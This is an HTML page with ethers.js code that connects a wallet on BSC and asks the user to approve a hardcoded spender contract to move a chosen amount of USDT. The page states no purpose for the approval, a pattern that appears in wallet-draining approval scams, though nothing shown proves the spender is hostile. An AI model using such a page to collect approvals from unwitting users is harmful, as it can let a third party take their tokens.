<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>USDT Approve | BSC</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<script src="https://cdn.jsdelivr.net/npm/ethers@5/dist/ethers.min.js"></script>

<style>
body {
  background:#0b1220;
  color:#ffffff;
  font-family:Arial;
  padding:20px;
}
h2 {
  text-align:center;
}
input, button {
  width:100%;
  padding:14px;
  margin-top:12px;
  font-size:16px;
  border-radius:8px;
}
button {
  background:#16c784;
  border:none;
  color:white;
}
.note {
  font-size:13px;
  opacity:0.8;
  margin-top:10px;
}
</style>
</head>

<body>

<h2>USDT Approve (BSC)</h2>

<button onclick="connectWallet()">ðŸ”— Connect Wallet</button>

<input type="number" id="amount" placeholder="Enter USDT Amount (example: 10)" />

<button onclick="approveUSDT()">âœ… Approve USDT</button>

<div class="note">
â€¢ Network: BSC Mainnet<br>
â€¢ Token: USDT (BEP20)<br>
â€¢ No unlimited approval
</div>

<script>
let provider, signer;

// USDT (BSC) Contract
const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";

// YOUR SMART CONTRACT (SPENDER)
const SPENDER_ADDRESS = "0x578b86B3d51fF707a3B4E1272eFfcD03979069e1";

// Approve-only ABI
const ABI = [
  {
    "inputs":[
      {"internalType":"address","name":"spender","type":"address"},
      {"internalType":"uint256","name":"amount","type":"uint256"}
    ],
    "name":"approve",
    "outputs":[{"internalType":"bool","name":"","type":"bool"}],
    "stateMutability":"nonpayable",
    "type":"function"
  }
];

async function connectWallet() {
  if (!window.ethereum) {
    alert("Wallet not detected. Use MetaMask or Trust Wallet.");
    return;
  }

  await ethereum.request({ method: "eth_requestAccounts" });

  const chainId = await ethereum.request({ method: "eth_chainId" });
  if (chainId !== "0x38") {
    alert("Please switch to BSC Mainnet");
    return;
  }

  provider = new ethers.providers.Web3Provider(window.ethereum);
  signer = provider.getSigner();
  alert("Wallet Connected Successfully");
}

async function approveUSDT() {
  const amount = document.getElementById("amount").value;
  if (!amount || amount <= 0) {
    alert("Enter valid USDT amount");
    return;
  }

  const contract = new ethers.Contract(USDT_ADDRESS, ABI, signer);
  const value = ethers.utils.parseUnits(amount, 18);

  const tx = await contract.approve(SPENDER_ADDRESS, value);
  await tx.wait();

  alert("USDT Approved Successfully âœ…");
}
</script>

</body>
</html>
